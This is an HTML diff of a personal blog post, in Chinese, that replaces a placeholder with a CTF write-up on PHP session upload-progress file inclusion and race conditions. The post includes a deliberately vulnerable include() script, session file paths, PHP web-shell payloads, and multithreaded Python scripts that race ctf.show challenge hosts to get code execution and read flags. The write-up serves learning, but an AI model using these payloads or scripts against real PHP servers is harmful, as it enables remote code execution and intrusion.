@@ -11,7 +11,7 @@
   <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-  <title>测试文章 | K1he</title>
+  <title>CTF中Session文件包含与条件竞争 | K1he</title>
 
   <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
   <link rel="stylesheet" href="https://at.alicdn.com/t/font_1911880_c1nvbyezg17.css">
@@ -688,7 +688,7 @@
 
 
 
-<div class="post-detail-header lazyload" id="thumbnail_canvas" data-original="/medias/9.jpg" style="background-repeat: no-repeat; background-size: cover; 
+<div class="post-detail-header lazyload" id="thumbnail_canvas" data-original="/medias/7.jpg" style="background-repeat: no-repeat; background-size: cover; 
   background-position: center center;position: relative;">
   <div class="post-detail-header-mask"></div>
   <canvas id="header_canvas"style="position:absolute;bottom:0;pointer-events:none;"></canvas>
@@ -696,14 +696,14 @@
   <div class="post-detail-header_info-box">
     <div class="title-box">
       <span class="title">
-        测试文章
+        CTF中Session文件包含与条件竞争
       </span>
     </div>
     
     
       
         <span class="post-detail-header_date">
-          <i class="fa fa-calendar"></i> 发表于：2021-09-15 |
+          <i class="fa fa-calendar"></i> 发表于：2021-09-16 |
         </span>
       
 
@@ -725,16 +725,56 @@
     <article class="post post-detail">
       
       <div class="post-content">
-        <p>这是一篇测试文章用于测试图片是否而可用。</p>
-<p><img "" class="lazyload placeholder" data-original="https://i.loli.net/2021/09/15/pSd51UOeKXGmVWQ.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210915225327523"></p>
+        <h1 id="CTF中Session文件包含与条件竞争"><a href="#CTF中Session文件包含与条件竞争" class="headerlink" title="CTF中Session文件包含与条件竞争"></a>CTF中Session文件包含与条件竞争</h1><p>记得2021ciscn国赛初赛给了一道session竞争的题目。上次CTFSHOW 吃瓜杯也做到了session条件竞争。这次2021祥云杯又出了这个考点。三次都没做出来。嘻嘻嘻!🤭。所以今天决定花时间把这个考点搞清除，整明白。</p>
+<p>##session知识点</p>
+<p>众所周知，session是会出现在我们的cookie当中。作为一种用户凭证。在PHP 5.4以上的版本，session中多了一个记录文件上传进度的功能。那么现在说一下如果要利用条件竞争，需要的几个必备条件。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">session.upload_progress.enabled = on:该参数设置为On时，才会进行文件上传进度的记录。</span><br><span class="line"></span><br><span class="line">session.upload_progress.cleanup = on:该参数开启时，会在文件上传结束时对用户session内容进行自动清除。</span><br><span class="line"></span><br><span class="line">session.upload_progress.name = <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:	该参数与prefix作为我们的键名。方便我们的shell编写，可控。</span><br><span class="line"></span><br><span class="line">session.upload_progress.prefix = <span class="string">&quot;upload_progress_&quot;</span>:该参数表示与name一起构成我们的键名。</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="本地复现搭建"><a href="#本地复现搭建" class="headerlink" title="本地复现搭建"></a>本地复现搭建</h2><h3 id="关闭cleanup"><a href="#关闭cleanup" class="headerlink" title="关闭cleanup"></a>关闭cleanup</h3><p>为了对该知识点有一个初步认识，我们先做一个难度不大的。先将session.upload_progress.cleanup = Off。这样我们上传的东西不会删</p>
+<p>修改php.ini的方法：将最前面的分号替换为空格即可。注意一定要有空格。</p>
+<p>本地创建一个Session_Test.php。加入如下代码。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[file];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure>
+
+<p>添加cookie:PHPSESSID=k1he 刷新后会发现我们的session存放目录下多了一个sess_k1he。<img "" class="lazyload placeholder" data-original="https://i.loli.net/2021/09/16/A2OY1zBEvbkFxfe.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210916204813648"></p>
+<p>可以发现里面什么内容都没有。现在我们利用post上传一个文件，让里面有东西。</p>
+<p><img "" class="lazyload placeholder" data-original="https://i.loli.net/2021/09/16/r8pwjXHNlUAQnoO.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210916204800558"></p>
+<p>我们截取一个表单上传文件的页面。可以发先表单上传文件时有几个重点</p>
+<p>有了这个数据，那么我们可以用python模拟Post上传文件。进而达到shell的写入。</p>
+<p>这里再贴一个上传表单的格式与上传后的结果</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// PHPSESSION = test</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;upload.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file1&quot;</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file2&quot;</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img "" class="lazyload placeholder" data-original="https://i.loli.net/2021/09/16/aXwqtGfgZ2UdbI8.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210916204746218"></p>
+<p>可以看见上传后我们的upload_progress_123 这里123是我们可控的。那么我们只用post我们需要的参数即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cookie = &#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sessid&#125;,</span><br><span class="line">data = &#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&quot;&lt;?php eval($_POST[1]);?&gt;&quot;</span>&#125;,</span><br><span class="line">files = &#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;k1he.txt&#x27;</span>,f)&#125;</span><br><span class="line">这样就能模拟我们的post文件上传了。</span><br></pre></td></tr></table></figure>
+
+<p>上传文件后，里面会有序列化后的我们的data内容。</p>
+<p>这时候，我们再包含这个session文件，那么我们就可以RCE了。</p>
+<h3 id="开启cleanup"><a href="#开启cleanup" class="headerlink" title="开启cleanup"></a>开启cleanup</h3><p>开启cleanup后，我们的文件上传完毕后，会对我们session文件里的内容全部删除。这时候我们就需要利用条件竞争。一直不停的上传文件，从而使我们的内容来不及删除，从而被我们利用。并且使用双线程</p>
+<h2 id="题目复现"><a href="#题目复现" class="headerlink" title="题目复现"></a>题目复现</h2><h3 id="先整个简单的-ctfshow-web入门-82-86-通杀脚本"><a href="#先整个简单的-ctfshow-web入门-82-86-通杀脚本" class="headerlink" title="先整个简单的 ctfshow web入门 82~86 通杀脚本"></a>先整个简单的 ctfshow web入门 82~86 通杀脚本</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看见是一个文件包含题目，将伪协议过滤完了。通过cookie发现存在session。那么考虑session文件包含。</p>
+<h4 id="一般session的存放位置"><a href="#一般session的存放位置" class="headerlink" title="一般session的存放位置"></a>一般session的存放位置</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/<span class="keyword">var</span>/lib/php/</span><br><span class="line">/<span class="keyword">var</span>/lib/php/sessions/</span><br><span class="line">/tmp/</span><br><span class="line">/tmp/sessions/</span><br><span class="line">本题型一律采用/tmp/形式</span><br></pre></td></tr></table></figure>
+
+<p>那么直接选择使用脚本:我是先ls一下，再使用脚本拿flag。这里需要注意的是：</p>
+<p>我们拿到的数据长这样。前面讲过了，我们的键名的格式就是upload_progress_+数据两个部分</p>
+<p><img "" class="lazyload placeholder" data-original="https://i.loli.net/2021/09/16/LycrhM3Qng5tuSq.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210916204720957"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment"># @Author: k1he</span></span><br><span class="line"><span class="comment"># @Date:   2021-08-23 18:08:10</span></span><br><span class="line"><span class="comment"># @Last Modified by:   k1he</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2021-08-23 20:19:18</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">sessid = <span class="string">&#x27;k1he&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://a0c9ce43-6c4d-4b28-aa61-1c7a6eb40879.challenge.ctf.show:8080/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> event.isSet():</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span>* <span class="number">1024</span> * <span class="number">50</span>)                     <span class="comment">#创建文件</span></span><br><span class="line">        response = session.post(                            <span class="comment">#post文件上传</span></span><br><span class="line">            url,                                            <span class="comment">#url</span></span><br><span class="line">            cookies = &#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sessid&#125;,                   <span class="comment">#设置cookie为我们的sessid</span></span><br><span class="line">            data = &#123; <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&quot;&lt;?php system(&#x27;cat *fl0g.php&#x27;);?&gt;&quot;</span>&#125;,<span class="comment">#写马或执行内容</span></span><br><span class="line">            files = &#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&#x27;k1he.txt&#x27;</span>,f)&#125;                 <span class="comment">#上传文的具体内容，文件名和文件内容</span></span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> event.isSet():</span><br><span class="line">        payload = <span class="string">&quot;?file=/tmp/sess_&quot;</span>+sessid                 <span class="comment">#包含我们的session路径</span></span><br><span class="line"></span><br><span class="line">        response = session.get(url = url+payload)           <span class="comment">#读取页面</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;k1he.txt&#x27;</span> <span class="keyword">in</span> response.text:                     <span class="comment">#返回页面</span></span><br><span class="line">            <span class="built_in">print</span>(response.text)</span><br><span class="line">            event.clear</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*]retrying!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:                                  <span class="comment">#双线程运行</span></span><br><span class="line">    event = threading.Event()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read,args=(session,)).start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="ctfshow-web-150plus-这里是非预期，预期解我不会嘻嘻嘻。"><a href="#ctfshow-web-150plus-这里是非预期，预期解我不会嘻嘻嘻。" class="headerlink" title="ctfshow web 150plus:这里是非预期，预期解我不会嘻嘻嘻。"></a>ctfshow web 150plus:这里是非预期，预期解我不会嘻嘻嘻。</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment"># @Author: k1he</span></span><br><span class="line"><span class="comment"># @Date:   2021-08-23 18:08:10</span></span><br><span class="line"><span class="comment"># @Last Modified by:   k1he</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2021-08-23 20:34:04</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">sessid = <span class="string">&#x27;k1he&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://522d8444-7909-4206-af01-bc1257b3c59d.challenge.ctf.show:8080/?isVIP=1&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> event.isSet():</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span>* <span class="number">1024</span> * <span class="number">50</span>)                     <span class="comment">#创建文件</span></span><br><span class="line">        response = session.post(                            <span class="comment">#post文件上传</span></span><br><span class="line">            url,                                            <span class="comment">#url</span></span><br><span class="line">            cookies = &#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sessid&#125;,                   <span class="comment">#设置cookie为我们的sessid</span></span><br><span class="line">            data = &#123; <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&quot;&lt;?php system(&#x27;cat flag.php&#x27;);?&gt;&quot;</span>&#125;,<span class="comment">#写马或执行内容</span></span><br><span class="line">            files = &#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&#x27;k1he.txt&#x27;</span>,f)&#125;                 <span class="comment">#上传文的具体内容，文件名和文件内容</span></span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> event.isSet():</span><br><span class="line">        data =&#123;</span><br><span class="line">            <span class="string">&#x27;ctf&#x27;</span>:<span class="string">&quot;/tmp/sess_&quot;</span>+sessid </span><br><span class="line">        &#125;</span><br><span class="line">                         <span class="comment">#包含我们的session路径</span></span><br><span class="line"></span><br><span class="line">        response = session.post(url = url,data =data)           <span class="comment">#读取页面</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;k1he.txt&#x27;</span> <span class="keyword">in</span> response.text:                     <span class="comment">#返回页面</span></span><br><span class="line">            <span class="built_in">print</span>(response.text)</span><br><span class="line">            event.clear</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*]retrying!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:                                  <span class="comment">#双线程运行</span></span><br><span class="line">    event = threading.Event()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read,args=(session,)).start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>​    </p>
 
       </div>
       <div class="post-tags-categories">
         
         <div class="tags">
           
-            <a href="/tags/CTF/" class="">
-              CTF
+            <a href="/tags/CTF-web/" class="">
+              CTF-web
             </a>
           
         </div>
@@ -748,7 +788,7 @@
     </li>
     <li class="post-copyright-link">
     <strong>文章链接:  </strong>
-    <a href="/2021/09/15/测试文章/" target="_blank" title="测试文章">https://k1he.github.io/2021/09/15/测试文章/</a>
+    <a href="/2021/09/16/CTF中Session文件包含与条件竞争-cnblog/" target="_blank" title="CTF中Session文件包含与条件竞争">https://k1he.github.io/2021/09/16/CTF中Session文件包含与条件竞争-cnblog/</a>
     </li>
     <li class="post-copyright-license">
       <strong>版权声明:   </strong>
@@ -766,20 +806,38 @@
 
 
 
+  
+  <div class="post-nav-prev post-nav-item">
+    <div class="post-nav-img lazyload" data-original="/medias/10.jpg" style="background-size: cover; 
+      background-position: center center;">
+    </div>
+    <a href="/2021/09/16/PHP%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" class="post-nav-link">
+      <div class="title">
+        <i class="fa fa-angle-left"></i> 上一篇:
+        <div class="title-text">PHP中的命令执行与代码执行</div>
+      </div>
+      
+      <!-- <div class="content">
+        PHP中的命令执行与代码执行最近在复习之前学过得知识点。因为之前是0基础来学习的，所以很多东西可能是没有弄懂的。现在重新
+      </div> -->
+    </a>
+  </div>
+
 
 
   
   <div class="post-nav-next post-nav-item">
-    <div class="post-nav-img lazyload" data-original="/medias/6.jpg" style="background-size: cover; 
+    <div class="post-nav-img lazyload" data-original="/medias/1.jpg" style="background-size: cover; 
       background-position: center center;">
     </div>
-    <a href="/2021/09/14/hello-world/" class="post-nav-link">
+    <a href="/2021/09/16/CTFSHOW_PHP%E7%89%B9%E6%80%A7/" class="post-nav-link">
       <div class="title">
         下一篇: <i class="fa fa-angle-right"></i>
-        <div class="title-text">BJCTF2020-EZPHP</div>
+        <div class="title-text">CTFSHOW-PHP特性</div>
       </div>
       <!-- <div class="content">
-        题目1234567891011121314151617181920212223242526272829303132333
+        ﻿﻿# web 89:数组绕过正则
+12345678910111213141516&lt;?phpinclude(&qu
       </div> -->
     </a>
   </div>
